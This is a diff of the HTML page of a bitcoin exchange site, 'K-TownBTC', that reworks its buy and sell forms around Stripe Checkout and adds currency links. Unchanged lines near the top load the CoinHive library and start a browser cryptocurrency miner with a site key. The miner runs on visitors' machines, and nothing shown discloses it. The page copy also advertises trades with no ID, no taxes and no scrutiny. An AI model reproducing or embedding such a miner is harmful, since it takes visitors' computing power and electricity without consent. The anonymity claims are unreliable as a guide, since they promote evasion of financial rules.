@@ -18,6 +18,7 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://checkout.stripe.com/checkout.js"></script>
 <script>
   var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
   miner.start();
@@ -28,7 +29,10 @@
   var rate;
   var buycad;
   var sellcad;
-  var amount;
+  var buyamount;
+  var buytotal;
+  var sellamount;
+  var selltotal;
 
   function roundUp(num, precision) {
   return Math.ceil(num * precision) / precision
@@ -44,9 +48,21 @@
 
                  buy = roundUp(jsonRes.vwap, 1000);
                  sell = roundUp(jsonRes.vwap, 1000);
+                 $("#buyusdbot").text(buy);
                  $("#buyusdbot2").text(buy);
-                 $("#amountdisplay").text("1");
-                 $("#total").val(roundUp((buy * 1.06), 100));
+                 $("#buyamountdisplay").text("1");
+                 buyamount = 1;
+                 buytotal = roundUp((buy * 1.06), 100);
+                 $("#buytotal").val(buytotal);
+                 $('#buyBitcoinButton').text('Buy ' + buyamount + ' Bitcoin for $' + buytotal + ' USD');
+
+				 $("#sellusdbot").text(sell);
+                 $("#sellusdbot2").text(sell);
+                 $("#sellamountdisplay").text(sell);
+                 sellamount = 1;
+                 selltotal = roundUp((sell * 1.06), 100);
+                 $("#selltotal").val(selltotal);
+                 $('#sellBitcoinButton').text('Buy $' + selltotal + ' USD for ' + sellamount + ' BTC');
 
         }
     }
@@ -93,20 +109,26 @@
             <li class="nav-item">
               <a class="nav-link" href="mailto:support@k-townbtc.com">Contact</a>
             </li>
-             <li class="nav-item">
-              <a class="btn btn-outline-warning my-2 my-sm-0" style="margin-left: 25px;" href="#exchange">Buy &middot; <span id="buycadtop"></span> CAD$ &middot; $<span id="buyusdtop"></span> USD</a>
-            </li>
             <li class="nav-item">
-              <a class="btn btn-outline-warning my-2 my-sm-0" style="margin-left: 25px;margin-right: 25px;" href="#exchange">Sell &middot; <span id="sellcadtop"></span> CAD$ &middot; $<span id="sellusdtop"></span> USD</a>
+            	<h4 style="position:relative;left:20px;top:3px;"><span class="badge badge-secondary">$<span id="buyusdbot"></span> USD</span></h4>
             </li>
-           <!-- <li class="nav-item">
-              <a class="nav-link disabled" href="#">Disabled</a>
-            </li>-->
           </ul>
-          <form class="form-inline mt-2 mt-md-0">
-            <!--<input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
-            <button class="btn btn-outline-warning my-2 my-sm-0" type="submit">5500$</button>-->
-          </form>
+         <nav class="navbar navbar-dark bg-dark">
+         	<ul class="navbar-nav mr-auto">
+         		<li class="nav-item active">
+				  <a class="navbar-brand nav-link active" href="/">
+				    <img src="img/US.png" width="30" height="30" class="d-inline-block align-top" alt="">
+				    USD
+				  </a>
+				</li>
+				<li class="nav-item">
+				  <a class="navbar-brand nav-link" href="/CAD.html">
+				    <img src="img/CA.png" width="30" height="30" class="d-inline-block align-top" alt="">
+				    CAD
+				  </a>
+				</li>
+			</ul>
+		</nav>
         </div>
       </nav>
     </header>
@@ -128,7 +150,7 @@
               <div class="carousel-caption">
                 <h1>Hassle-Free Exchange</h1>
                 <p>No taxes, smaller fees, no personal information required. All of this because we operate in complete legality, at the heart of the Kahnawake Reserve. Cash-Only for now.</p>
-                <p><a class="btn btn-lg btn-primary" style="text-shadow:none;" href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381" role="button">Show on Map</a></p>
+                <p><a class="btn btn-lg btn-secondary" style="text-shadow:none;" href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381" role="button">Show on Map</a></p>
               </div>
             </div>
           </div>
@@ -138,7 +160,7 @@
               <div class="carousel-caption">
                 <h1>Best-In-Class Customer Service</h1>
                 <p>We offer dedicated support and patience to every customer who comes to our office. Don't hesitate to reach out to us, and come say 🖐 when you pass by!</p>
-                <p><a class="btn btn-lg btn-primary" style="text-shadow:none;" href="mailto:support@k-townbtlc.com" role="button">Contact</a></p>
+                <p><a class="btn btn-lg btn-secondary" style="text-shadow:none;" href="mailto:support@k-townbtlc.com" role="button">Contact</a></p>
               </div>
             </div>
           </div>
@@ -148,7 +170,7 @@
               <div class="carousel-caption">
                 <h1>An Entity you can Trust</h1>
                 <p>Backed by years of running businesses, stock exchange and bitcoin mining operations, our team of higly qualified people are there to help you exchange Bitcoin and advise you at every steps.</p>
-                <p><a class="btn btn-lg btn-primary" style="text-shadow:none;" href="#exchange" role="button" data-toggle="modal" data-target="#buybitcoin">Exchange</a></p>
+                <p style="position: relative;left:10px;"><a class="btn btn-lg btn-secondary" style="text-shadow:none;margin-right:15px;" href="#buybitcoin">Buy Bitcoin</a> or <a class="btn btn-lg btn-secondary" style="text-shadow:none;" href="#sellbitcoin">Sell Bitcoin</a></p>
               </div>
             </div>
           </div>
@@ -171,72 +193,178 @@
     <hr class="featurette-divider">
 
  <!-- Three columns of text below the carousel -->
-        <div class="row" id="exchange">
-          <div class="col-lg-6" style="text-align: center;">
+        <div class="row" id="buybitcoin">
+          <div class="col-lg-12" style="text-align: center;">
+          	<h3><span class="badge badge-secondary">Buy Bitcoin</span></h3><br/>
             <img class="rounded-circle" src="img/btc-logo.png" alt="bitcoin" width="140" height="140">
-            <button class="btn btn-lg btn-outline-success my-2 my-sm-0" data-toggle="modal" data-target="#buybitcoin" type="submit">$<span id="buyusdbot"></span> USD</button>
-<br/>
-          <form action="/your-server-side-code-usd" method="POST">
+			<br/>
+          <form id="formbuy" action="https://k-town-stripe.herokuapp.com" method="POST">
             <br/>
-            <span>Buy <input type="text" id="amount" value="1" size="10" onchange="
-            amount=$('#amount').val();
-            $('#amountdisplay').text(amount);
-            $('#total').val(roundUp((amount * buy * 1.06), 100));"></input> BTC at the price of $<span id="buyusdbot2"></span> USD.<br/>
-            Your total is $<input type="text" id="total" size="10" onchange="
-            total=$('#total').val();
-            $('#amount').val(roundUp((total / buy / 1.06), 10000));
-            $('#amountdisplay').text(amount);"></span> USD, including the 6% <a href="">transaction fee.</a></span><br/>
-            <span>We will send your <span id="amountdisplay"></span> BTC to this address : <input type="text" id="btcaddress" ></input></span><br/><br/>
-              <script
-                src="https://checkout.stripe.com/checkout.js" class="stripe-button"
-                data-key="pk_test_UNxP2GG9bvyICle3JasumBaD"
-                data-amount=""
-                data-currency="USD"
-                data-name="K-TownBTC"
-                data-description="Buy Bitcoin"
-                data-label="Buy Bitcoin"
-                data-image="https://www.k-townbtc.com/img/headdress2.png"
-                data-locale="auto"
-                data-bitcoin="false">
-              </script>
+            <span class="lead">Buy <input type="text" id="buyamount" value="1" size="10" onchange="
+
+	             if($('#buyamount').val()>0){
+		            buyamount=$('#buyamount').val();
+		        }else{
+		        	$('#buyamount').val('1');
+		        	buyamount=1;
+		        }
+	            $('#buyamountdisplay').text(buyamount);
+	            buytotal = roundUp((buyamount * buy * 1.06), 100);
+	            $('#buytotal').val(buytotal);
+	            $('#buyBitcoinButton').text('Buy ' + buyamount + ' BTC for $' + buytotal + ' USD');
+
+	            "></input> BTC at the price of $<span id="buyusdbot2"></span> USD.
+	            <br/>
+	            <br/>
+	            Your total is $<input type="text" id="buytotal" size="10" onchange="
+
+	            buytotal=$('#buytotal').val();
+	            buyamount = roundUp((buytotal / buy / 1.06), 10000);
+	            $('#buyamount').val(buyamount);
+	            $('#buyamountdisplay').text(buyamount);
+	            $('#buyBitcoinButton').text('Buy ' + buyamount + ' BTC for $' + buytotal + ' USD');
+
+	            "></input> USD, including the 6% <a href="#" data-toggle="modal" data-target="#transactionfees">transaction fee.</a>
+        	</span>
+        	<br/>
+        	<br/>
+            
+            <span class="lead">We will send your <span id="buyamountdisplay"></span> BTC to this address : 
+            <input type="text" id="buybtcaddress" ></input>
+        	</span>
+        	<br/>
+        	<br/>
+
+            <button class="btn btn-outline-secondary btn-lg" id="buyBitcoinButton"></button>
+
+				<script>
+				var handler = StripeCheckout.configure({
+				  key: 'pk_test_UNxP2GG9bvyICle3JasumBaD',
+				  image: 'https://www.k-townbtc.com/img/headdress2.png',
+				  locale: 'auto',
+				  token: function(token) {
+				    // You can access the token ID with `token.id`.
+				    // Get the token ID to your server-side code for use.
+				  }
+				});
+
+				document.getElementById('buyBitcoinButton').addEventListener('click', function(e) {
+				  // Open Checkout with further options:
+				  handler.open({
+				    name: 'K-TownBTC',
+				    description: "Buy " + $('#buyamount').val() + " BTC for $" + roundUp(($('#buyamount').val() * buy * 1.06), 100) + " USD",
+				    zipCode: true,
+				    bitcoin: 	false,
+				    currency: 	"USD",
+				    amount: (roundUp(($('#buyamount').val() * buy * 1.06), 100) * 100)
+				  });
+				  e.preventDefault();
+				});
+
+				// Close Checkout on page navigation:
+				window.addEventListener('popstate', function() {
+				  handler.close();
+				});
+				</script>
             </form>
-                  <!-- Modal -->
-                  <div class="modal fade" id="buybitcoin" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
-                    <div class="modal-dialog" role="document">
-                      <div class="modal-content">
-                        <div class="modal-header">
-                          <h5 class="modal-title" id="exampleModalLabel">Online purchases desactivated</h5>
-                          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                            <span aria-hidden="true">&times;</span>
-                          </button>
-                        </div>
-                        <div class="modal-body">
-                        Unfortunately, online purchases are desactivated at the moment. While it gets fixed, <a href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381">meet us in person!</a>
-                        </div>
-                        <div class="modal-footer">
-                          <a href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381" role="button" class="btn btn-primary">Show on Map</a>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
+
 
           </div><!-- /.col-lg-4 -->
-          <div class="col-lg-6">
-            <img class="rounded-circle" src="img/CAD-logo.png" alt="Generic placeholder image" width="140" height="140">
-            <button class="btn btn-lg btn-outline-warning  my-2 my-sm-0" type="submit" data-toggle="modal" data-target="#buybitcoin">Sell &middot; <span id="sellcadbot"></span> CAD$ &middot; $<span id="sellusdbot"></span> USD</button>
-            <form action="/your-server-side-code-btc-usd" method="POST">
-              <script
-                src="https://checkout.stripe.com/checkout.js" class="stripe-button"
-                data-key="pk_test_UNxP2GG9bvyICle3JasumBaD"
-                data-amount="<script>window.sellcad</script>"
-                data-currency="USD"
-                data-name="K-TownBTC"
-                data-description="Buy USD with BTC"
-                data-label="Buy USD with BTC"
-                data-image="https://www.k-townbtc.com/img/headdress2.png"
-                data-locale="auto"
-                data-bitcoin="true">
-              </script>
+      </div>
+         <hr class="featurette-divider">
+          <div class="row" id="sellbitcoin">
+          <div class="col-lg-12" style="text-align: center;">
+          	<h3><span class="badge badge-secondary">Sell Bitcoin</span></h3><br/>
+            <img class="rounded-circle" src="img/USD-logo.png" alt="Generic placeholder image" width="140" height="140">
+            <form id="formsell" action="https://k-town-stripe.herokuapp.com" method="POST">
+	            <br/>
+	            <span class="lead">Sell <input type="text" id="sellamount" value="1" size="10" onchange="
+	            	if($('#sellamount').val()>0){
+		            sellamount=$('#sellamount').val();
+		        }else{
+		        	$('#sellamount').val('1');
+		        	sellamount=1;
+		        }
+		            $('#sellamountdisplay').text(sellamount);
+		            selltotal = roundUp((sellamount * sell * 1.06), 100);
+		            $('#selltotal').val(selltotal);
+		            $('#sellBitcoinButton').text('Buy $' + selltotal + ' USD for ' + sellamount + ' BTC');
+
+		            "></input> BTC at the price of $<span id="sellusdbot2"></span> USD.
+		            <br/>
+		            <br/>
+		            We will send you $<input type="text" id="selltotal" size="10" onchange="
+
+		            selltotal=$('#selltotal').val();
+		            sellamount = roundUp((selltotal / sell / 1.06), 10000);
+		            $('#sellamount').val(sellamount);
+		            $('#sellamountdisplay').text(selltotal);
+		            $('#sellBitcoinButton').text('Buy $' + selltotal + ' USD for ' + sellamount + ' BTC');
+
+		            "></input> USD, including the 6% <a href="#" data-toggle="modal" data-target="#transactionfees" >transaction fee.</a>
+
+
+					<!-- Modal -->
+					<div class="modal fade" id="transactionfees" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+					  <div class="modal-dialog" role="document">
+					    <div class="modal-content">
+					      <div class="modal-header">
+					        <h5 class="modal-title" id="exampleModalLabel">Transaction Fees</h5>
+					        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					          <span aria-hidden="true">&times;</span>
+					        </button>
+					      </div>
+					      <div class="modal-body">
+					        Unlike other Bitcoin ATM, we offer a smaller fee of only 6% to cover our expenses.
+					        <br/><br/>
+					        We can acheive such a lower fee, because we reside on the Kahnawake Reserve, thus we have no taxes to fill nor do we need your ID.
+					      </div>
+					      <div class="modal-footer">
+					        <button type="button" class="btn btn-secondary" data-dismiss="modal">Understood!</button>
+					      </div>
+					    </div>
+					  </div>
+					</div>
+	        	</span>
+	        	<br/>
+	        	<br/>
+		            <span class="lead">Enter your prefered method of payment, to send $<span id="sellamountdisplay"></span> USD : <input type="text" id="sellmethod" ></input>
+
+		        <br/>	<br/>* Be sure to select the <strong><em>Bitcoin</em></strong> tab on the checkout page to pay by Bitcoin.
+	        	</span>
+	        	<br/>
+	        	<br/>
+	            <button class="btn btn-outline-secondary btn-lg" id="sellBitcoinButton"></button>
+
+					<script>
+					var handler = StripeCheckout.configure({
+					  key: 'pk_test_UNxP2GG9bvyICle3JasumBaD',
+					  image: 'https://www.k-townbtc.com/img/headdress2.png',
+					  locale: 'auto',
+					  token: function(token) {
+					    // You can access the token ID with `token.id`.
+					    // Get the token ID to your server-side code for use.
+					  }
+					});
+
+					document.getElementById('sellBitcoinButton').addEventListener('click', function(e) {
+					  // Open Checkout with further options:
+					  handler.open({
+					    name: 'K-TownBTC',
+					    description: "Buy $" + roundUp(($('#sellamount').val() * sell * 1.06), 100) + " USD for " + $('#sellamount').val() + " BTC",
+					    zipCode: true,
+					    bitcoin: 	true,
+					    currency: 	"BTC",
+					    amount: ($('#sellamount').val() * 100000000)
+					  });
+					  e.preventDefault();
+					});
+
+					// Close Checkout on page navigation:
+					window.addEventListener('popstate', function() {
+					  handler.close();
+					});
+				</script>
             </form>
           </div><!-- /.col-lg-4 -->
         </div><!-- /.row -->
@@ -248,10 +376,11 @@
           <div class="col-md-7 order-md-2">
             <h2 class="featurette-heading">Unmatched Privacy. <span class="text-muted">It's our moto.</span></h2>
             <p class="lead">At K-town BTC we thrive on the privacy of our clients.
-This is why K-Town BTC allows high profile investors to execute transactions large or small without scrutiny and speculation of the markets.
-K-Town BTC will provide anonymity to investors and their transactions so as to not draw any attention to their trades.
-Any and all transactions will remain non public and confidential.
-This is the true meaning of Bitcoin.</p>
+				This is why K-Town BTC allows high profile investors to execute transactions large or small without scrutiny and speculation of the markets.
+				K-Town BTC will provide anonymity to investors and their transactions so as to not draw any attention to their trades.
+				Any and all transactions will remain non public and confidential.
+				This is the true meaning of Bitcoin.</p>
+				<p class="lead">Note : Because we use a partner, <a href="https://www.stripe.com">stripe</a>, to handle the online transactions, we can only garantee the security and anonymity of in-person transaction.
           </div>
           <div class="col-md-5 order-md-1">
             <img class="featurette-image img-fluid mx-auto" src="img/privacy.png" alt="Generic placeholder image">
